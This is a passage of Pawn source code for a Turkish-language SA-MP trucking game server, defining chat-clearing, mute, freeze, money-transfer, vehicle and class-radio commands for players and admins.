	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:ctemizle(playerid, params[])
{
    SendAdminText(playerid, "/ctemizle", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			for(new i = 0; i < 300; i++)
			{
			SendClientMessageToAll(-1," ");
			}
			SendClientMessageToAll(-1,"Chat Temizlendi // Sohbetimize Dikkat Edelim // Ýyi Oyunlar Dileriz");
		}
	}
	return 1;
}
CMD:cc(playerid, params[])
{
  return cmd_ctemizle(playerid, params);
}

CMD:pcc(playerid, params[])
{
    SendAdminText(playerid, "/pcc", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{

			for(new i = 0; i < 50; i++)
			{
			SendClientMessage(playerid, -1," ");
			}
			SendClientMessage(playerid,-1,"Chat Temizlendi // Sohbetimize Dikkat Edelim // Ýyi Oyunlar Dileriz");
	}
	return 1;
}

// Un-mutes a player (he cannot talk anymore)
CMD:unmute(playerid, params[])
{
	// Setup local variables
	new Msg[128], Name[24], AdminName[24], OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/unmute", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/unmute <ID>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
					// Get the player-names
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Un-mute the other player
					APlayerData[OtherPlayer][Muted] = 0;
					// Let the other player know that he has been un-muted
					format(Msg, 128, "{FF0000}Susturma cezanýzý {FFFF00}Admin %s {FF0000}açtý.", AdminName);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					// Let the admin know who he has un-muted
					format(Msg, 128, "{FFFF00}%s{00FF00}'nin susma cezasýný açtýnýz.", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Save the player-stats
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Let's the admins see which players are still muted
CMD:mutes(playerid, params[])
{
	// Setup local variables
	new PlayerList[1000], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/mutes", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			// Loop through all players
			for (new i; i < MAX_PLAYERS; i++)
			{
				// Check if that player is online
				if (IsPlayerConnected(i))
				{
				    if (APlayerData[i][Muted] > 0)
					{
						// Get the player's name
						GetPlayerName(i, Name, sizeof(Name));
						// Add his name and ID to the list
						format(PlayerList, sizeof(PlayerList), "%s%s (ID: %i) %d Saniye\n", PlayerList, Name, i, APlayerData[i][Muted]);
					}
				}
			}

			// Show the list of muted players to the admin
			if (strlen(PlayerList) != 0)
				ShowPlayerDialog(playerid, DialogNoResponse, DIALOG_STYLE_LIST, "Muted players:", PlayerList, "OK", "Cancel");
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}There are no muted players");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Freeze a player (he cannot move anymore)
CMD:dondur(playerid, params[])
{
	// Setup local variables
	new Msg[255], Name[24], AdminName[24], Reason[128], OtherPlayer, Duration;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/dondur", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "uis[128]", OtherPlayer, Duration, Reason)) SendSyntaxMessage(playerid, "/dondur <ID> <Saniye> <Sebep>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer) && freeze[OtherPlayer] == 0)
				{
					// Get the player-names
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Store the duration for the freeze, freeze him and start the frozentimer
					APlayerData[OtherPlayer][PlayerFrozen] = Duration;
					freeze[OtherPlayer] = 1;
					TogglePlayerControllable(OtherPlayer, 0);
					APlayerData[OtherPlayer][PlayerFrozenTimer] = SetTimerEx("Player_FreezeTimer", 1000, true, "i", OtherPlayer);
					// Let the other player know that he has been muted
					format(Msg, 128, "{FF0000} ADMIN : %s {FFFF00} tarafýndan donduruldunuz , {FF0000}Sebep : {FFFF00}%s", AdminName, Reason);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					// Let the admin know who he has muted
					format(Msg, 128, "{00FF00}Dondurdugunuz Oyuncu :{FFFF00} %s", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Save the player-stats
					Oyuncu_Kaydet(OtherPlayer);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{ff0000} Bu Oyuncu Aktif Degil Veya Zaten Dondurulmus.");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Transfer money to another player
CMD:paragonder(playerid, params[])
{
	// Setup local variables
	new Msg[128], Name[24], OtherName[24], OtherPlayer, Money;

	if(ParaVerTimer[playerid] > 0 && APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}5 dakikada bir para gönderebilirsiniz!");

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/paragonder", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "ui", OtherPlayer, Money)) SendSyntaxMessage(playerid, "/paragonder <ID> <miktar>");
		else
		{
			// Check if the otherplayer is online
			if (IsPlayerConnected(OtherPlayer))
			{
				// Get the player-names
				GetPlayerName(playerid, Name, sizeof(Name));
				GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));

				// Check if the money has a positive value (to prevent stealing money using negative values)
				if (Money > 0)
				{
					// Check if the player has enough money
					if (APlayerData[playerid][PlayerMoney] >= Money)
					{
					    if(Money > 3000000 && APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0)
					    {
					    SendClientMessage(playerid, 0xFFFFFFFF, "MAKSIMUM 3M GONDEREBILIRSINIZ , DAHA FAZLASI ICIN 7 LEVEL ADMINE DANISIN");
		 				}
		 				else
       {
						// Transfer the money
						RewardPlayer(playerid, -Money, 0);
						RewardPlayer(OtherPlayer, Money, 0);
						// Let the other player know that he has received money
						format(Msg, 128, "{00FF00} $%i {ffffff} kadar para size {00FF00} %s {FFFF00} tarafýndan gönderildi.", Money, Name);
						SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						// Let the player know he gave money to somebody else
						format(Msg, 128, "{00FF00}Siz {FFFF00}$%i{00FF00} Degerindeki parayi  {FFFF00}%s adlý oyuncuya gonderdiniz.", Money, OtherName);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);

						format(Msg, 128, "%s(%d) %s(%d)'a %d$ para gönderdi", GetName(playerid), playerid, GetName(OtherPlayer), OtherPlayer, Money);
						LOG(Msg);

						// Save the player-stats
						Oyuncu_Kaydet(playerid);
						Oyuncu_Kaydet(OtherPlayer);

						// Para Gönderme Kýsýtlamasý
						ParaVerTimer[playerid] = 300;
      }
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}O Kadar Paranýz Yok");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Sýfýrdan Büyük bir para giriniz.");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Boyle bir oyuncu yok");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Respawns the given vehicle
CMD:respawn(playerid, params[])
{
	// Setup local variables
	new vid, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/respawn", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", vid)) SendSyntaxMessage(playerid, "/respawn <Araç ID>");
			else
			{
				// Check if the vehicle-id is valid
				if ((vid > 0) && (vid < 2000))
				{
					// Check if the vehicle exists
					if (AVehicleData[vid][Model] != 0)
					{
					    // Force the vehicle to respawn
						SetVehicleToRespawn(vid);
						// Let the player know he respawned the vehicle
						format(Msg, 128, "{00FF00}You've respawned vehicle {FFFF00}%i", vid);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You have to use a vehicle-id between 1 and 1999");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command ejects a player from his vehicle
CMD:eject(playerid, params[])
{
	// Setup local variables
	new Name[24], AdminName[24], Msg[128], OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/eject", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 2
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/eject <ID>");
			else
			{
			    // Check if the player is logged in
				if (APlayerData[OtherPlayer][LoggedIn] == true)
				{
					// Check if the other player is driving a vehicle
					if (GetPlayerVehicleSeat(OtherPlayer) != -1)
					{
						// Get the names of the players
						GetPlayerName(playerid, AdminName, sizeof(AdminName));
						GetPlayerName(OtherPlayer, Name, sizeof(Name));
						// Eject the player from the vehicle
						RemovePlayerFromVehicle(OtherPlayer);
						// Let the player know he's been ejected from his vehicle
						format(Msg, 128, "{FF0000}You've been ejected from your vehicle by {FFFF00}%s", AdminName);
						SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
						// Inform the admin that he ejected the player
						format(Msg, 128, "{00FF00}You've ejected {FFFF00}%s{00FF00} from his vehicle", Name);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't inside a vehicle");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't connected");
			}
		}
		else
			return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
//aractancikar
// This command ejects a player from his vehicle
CMD:aractanat(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[128], OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/aractanat", params);

			// Get the player's name (the one who is trying to enter the vehicle)
			GetPlayerName(playerid, Name, sizeof(Name));
			// Check if the player is the driver of a vehicle
			if (GetPlayerVehicleSeat(playerid) == 0)
			{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/aractanat <ID>");
			// Check if the vehicle is owned by somebody else (strcmp will not be 0)
			//if (AVehicleData[GetPlayerVehicleID(playerid)][Owned] == true) != 0) SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu Arac sizin degil.");
			else
			{
			    // Check if the player is logged in
				if (APlayerData[OtherPlayer][LoggedIn] == true)
				{
					// Check if the other player is driving a vehicle
					if (GetPlayerVehicleSeat(OtherPlayer) != 0)
					{
						GetPlayerName(OtherPlayer, Name, sizeof(Name));
						// Eject the player from the vehicle
						RemovePlayerFromVehicle(OtherPlayer);
						// Inform the admin that he ejected the player
						format(Msg, 128, "{FFFF00}%s{00FF00} Aracindan cikardin", Name);
						SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu Oyuncu Aracta degil");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu Oyuncu Sunucuda degil");
			}
		}
		else
			SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aracin Sahibi(sürücüsü) deglsin");
	// Let the server know that this was a valid command
	return 1;
}
CMD:t(playerid, params[])
{
  return cmd_telsiz(playerid, params);
}
// This command lets you talk only to players of the same class
CMD:telsiz(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	// Setup local variables
	new Name[24], Msg[128], Message[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/telsiz", params);

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));
    if(APlayerData[playerid][PlayerScore] <= 5)return SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} Telsizde Sohbet edebilmeniz icin 5 Skor olmalisniz Sorularniz icin Adminlere /pm atiniz /yardim veya /sorusor !!");
    if(ServerAyarlari[ChatEngel] == 1)return SendClientMessage(playerid, -1, "{FF0000}Chat Engelinden dolayý telsiz kullanamýyorsunuz");
	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/telsiz <mesaj>");
		else
		{
			// Loop through all players
			for (new i; i < MAX_PLAYERS; i++)
			{
			    // Check if the player is logged in
				if (APlayerData[i][LoggedIn] == true)
				{
				switch (APlayerData[playerid][PlayerClass])
			{

				case ClassTruckDriver:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{FFFF00}[Týr Þoförleri Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassBusDriver:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{FF8000}[Otobüs Þöförleri Telsizi] %s:{B0B0B0} %s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassDolmusDriver:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{FF8000}[Dolmuþ Þöförleri Telsizi] %s:{B0B0B0} %s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassPilot:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{008080}[Pilot Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassPolice:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{0000FF}[Polis Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassMafia:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{8000FF}[Mafya Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassRoadWorker:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{FFFF80}[Ýþçi Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
   				case ClassGemici:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{80FFFF}[Gemici Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
      			case ClassOduncu:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{228B22}[Oduncu Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
        		case ClassBalikci:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{80FFFF}[Balýkçý Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
        		case ClassCopcu:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{CE576D}[Çöpçü Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
        		case ClassFBY:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{0073FF}[Çevik Kuvvet Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
        		case ClassBanka:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{99B4D1}[Banka Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassFire:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{8B008B}[Ýtfaye Telsizi] %s: {B0B0B0}%s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   }
				}
				case ClassPboy:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{FB8DC0}[Pizzacý Telsizi] %s:{B0B0B0} %s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   	}
				}
				case ClassKargocu:
				{
				    if (APlayerData[i][PlayerClass] == APlayerData[playerid][PlayerClass])
				    {
				    format(Msg, 128, "{53C900}[Kargocu Telsizi] %s:{B0B0B0} %s", Name, Message);
					SendClientMessage(i, 0xFFFFFFFF, Msg);
				   	}
				}
				}
				}
			}
		}
	}

	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


// This command lets you talk only to admin players
CMD:a(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[128], Message[128];

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is an admin
		if (APlayerData[playerid][PlayerLevel] > 0 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/a <Mesaj>");
			else
			{
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{EA25F4}[ADMIN Chat]%s(%d): {CBD2D1}%s", Name, playerid, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:gc(playerid, params[])
{
    if(ServerAyarlari[ChatEngel] == 1)
	{
		SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
		return 1;
	}
	
    if(APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Susturuldunuz konuþamazsýnýz !");
		return 1;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	// Setup local variables
	new Name[24], Msg[128], Message[128];
	SendAdminText(playerid, "/gc", params);
	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));
    if (APlayerData[playerid][PlayerScore] < 5000)return SendClientMessage(playerid, -1, "{FF0000}Geliþmiþ Chat Kullanmak için 5000 skor veya üstü olman lazým");
	if(ServerAyarlari[ChatEngel] == 1)return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Chat engelinden dolayý geliþmiþ chat kullanamýyorsunuz!");
	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is an admin
		if (APlayerData[playerid][PlayerScore] >= 5000 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/gc <mesaj>");
			else
			{
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerScore] >= 5000 || Root[i] == 1)
					    {
							format(Msg, 128, "{C53A3A}[GELÝÞMÝÞ CHAT]%s(%d): {CBD2D1}%s", Name, playerid, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
// This command lets you talk only to admin players
CMD:aa(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[128], Message[128];

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is an admin
		if (APlayerData[playerid][PlayerLevel] > 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/aa <mesaj>");
			else
			{
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 5 || Root[i] == 1)
					    {
							format(Msg, 128, "{FFC000}[UST SEVIYE]%s(%d): {CBD2D1}%s", Name, playerid, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:r(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[128], Message[128];

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is an admin
		if (APlayerData[playerid][PlayerLevel] > 1 || APlayerData[playerid][PlayerRehberLevel] > 0 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/r <mesaj>");
			else
			{
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 1 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{00C787}[REHBER Chat]%s: {CBD2D1}%s", Name, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
// This command lets you talk only to admin players
CMD:d(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[128], Message[128];

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is an admin
		if (APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerDjLevel] > 0 || Root[playerid] == 1)
		{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/d <mesaj>");
			else
			{
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerDjLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{A200C7}[DJ Chat]%s: {CBD2D1}%s", Name, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


// Clamp an owned vehicle (remove it completely)
CMD:clamp(playerid, params[])
{
	// Setup local variables
/*	new vid, Reason[128], HouseID, HouseOwner, Name[24], AdminName[24], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/clamp", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
			if (sscanf(params, "is[128]", vid, Reason)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/clamp <vehicleid> <reason>\"");
			else
			{
			    // Get the HouseID to which this vehicle belongs
				HouseID = AVehicleData[vid][BelongsToHouse];

				// Check if the vehicle belongs to a house
				if (HouseID != 0)
				{
					//Also set the new location of the vehicle inside the KACC Military fuels hangar
					AVehicleData[vid][SpawnX] = 2585.0;
					AVehicleData[vid][SpawnY] = 2829.0;
					AVehicleData[vid][SpawnZ] = 10.9;
					AVehicleData[vid][SpawnRot] = 0.0;

					// Search all the players to see who owns the house
					for (new i; i < MAX_PLAYERS; i++)
					{
						// Loop through all the houses this player owns
						for(new j; j < MAX_HOUSESPERPLAYER; j++)
						{
						    // Check if the player owns this house
							if (APlayerData[i][Houses][j] == HouseID)
							{
							    // Store the houseowner
							    HouseOwner = i;

								// Find the CarSlot where this vehicle exists
								for (new CarSlot; CarSlot < 11; CarSlot++)
								{
									// Check if the vehicle is stored in this carslot
									if (AHouseData[HouseID][VehicleIDs][CarSlot] == vid)
									{
										vid = House_ReplaceVehicle(HouseID, CarSlot); // Re-create the vehicle at the KACC Military fuels hangar
										// Set the vehicle as clamped (clamping needs to be done after re-creating the vehice, otherwise the wrong id can be clamped)
										AVehicleData[vid][Clamped] = true;
									}
								}

								break;
							}
						}
					}

					// Get the name of the admin and owner of the house
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(HouseOwner, Name, sizeof(Name));

					// Let the admin know who's vehicle he deleted
					format(Msg, 128, "{00FF00}You've clamped a vehicle that was owned by {FFFF00}%s", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Let the player know who deleted his vehicle
					format(Msg, 128, "{FF0000}A vehicle you owned was clamped by admin {FFFF00}%s", AdminName);
					SendClientMessage(HouseOwner, 0xFFFFFFFF, Msg);
					format(Msg, 128, "{FF0000}It belongs to house: {FFFF00}%s", AHouseData[HouseID][HouseName]);
					SendClientMessage(HouseOwner, 0xFFFFFFFF, Msg);
					format(Msg, 128, "{FF0000}Reason: {FFFF00}%s", Reason);
					SendClientMessage(HouseOwner, 0xFFFFFFFF, Msg);
					// Save the player's datafile (and his houses/businesses/vehicles)
					Oyuncu_Kaydet(HouseOwner);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That vehicle doesn't belong to a player, you cannot clamp it");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;
*/
	// Let the server know that this was a valid command
	return 1;
}

// This command can be used to unclamp all your vehicles at once
CMD:unclamp(playerid, params[])
{
	// Setup local variables
	new HouseID, vid, ClampedVehicles, UnclampPrice, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/unclamp", params);

	// Check if the player has logged in
